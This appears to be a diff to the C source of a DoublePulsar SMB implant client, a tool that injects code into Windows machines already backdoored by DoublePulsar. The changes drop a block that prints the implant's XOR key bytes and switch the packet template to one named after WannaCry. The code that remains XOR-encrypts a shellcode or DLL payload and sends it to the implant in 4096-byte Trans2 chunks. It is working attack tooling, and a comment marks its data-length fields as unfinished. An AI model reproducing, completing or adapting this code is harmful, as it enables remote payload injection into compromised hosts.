@@ -691,20 +691,6 @@ int main(int argc, char* argv[])
 	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
 	printf("Calculated XOR KEY:  0x%x\n", XorKey);
 	
-	//will use for re-sending the computed XOR key in the Trans2 SESSION_SETUP data parameters
-	unsigned char c[4];
-
-	c[0] = XorKey & 0xFF;
-	c[1] = (XorKey >> 8) & 0xFF;
-	c[2] = (XorKey >> 8 >> 8) & 0xFF;
-	c[3] = (XorKey >> 8 >> 8 >> 8) & 0xFF;
-
-	printf("XOR Key in characters ( needed for DoublePulsar SESSION Data ):\n");
-	printf("c[0] = %x \n", c[0]);
-	printf("c[1] = %x \n", c[1]);
-	printf("c[2] = %x \n", c[2]);
-	printf("c[3] = %x \n", c[3]);
-	
 	BUFFER_WITH_SIZE payload;
 	LPCSTR shellcode_file;
 	LPCSTR dll_file;
@@ -756,8 +742,8 @@ int main(int argc, char* argv[])
 		{
 			printf("Bytes left is less than 4096!...This will be the last & smaller packet!\n");
 			
-			//copy trans2 header to big packet
-			memcpy(big_packet, trans2_request, sizeof(trans2_request));
+			//copy the wannacry exec trans2 to big packet
+			memcpy(big_packet, wannacry_Trans2_Request, 70);
 
 			//update TreeId, UserID & ProcessID in packet
 			memcpy(big_packet + 28, (char*)&treeid, 2);
@@ -812,8 +798,8 @@ int main(int argc, char* argv[])
 			goto multiplexcheck;
 		}
 		
-		//copy the trans2 request to big_packet
-		memcpy(big_packet, trans2_request, sizeof(trans2_request));
+		//copy the exec trans2 request to big_packet
+		memcpy(big_packet, wannacry_Trans2_Request, 70);
 
 		//update TreeId, UserID & ProcessID in packet
 		memcpy(big_packet + 28, (char*)&treeid, 2);
@@ -848,7 +834,7 @@ int main(int argc, char* argv[])
 		memcpy(big_packet + 70, Parametersbuffer, 12);
 		
 		//copy 4096 bytes at a time from the XOR encrypted buffer
-		memcpy(big_packet +  70 + 12, (char*)encrypted+ctx, 4096);
+		memcpy(big_packet + 70 + 12, (char*)encrypted+ctx, 4096);
 
 		//FIX ME!  Fix the data len values
 		//Trans2.Session_Data_Length = sizeof(encrypted);
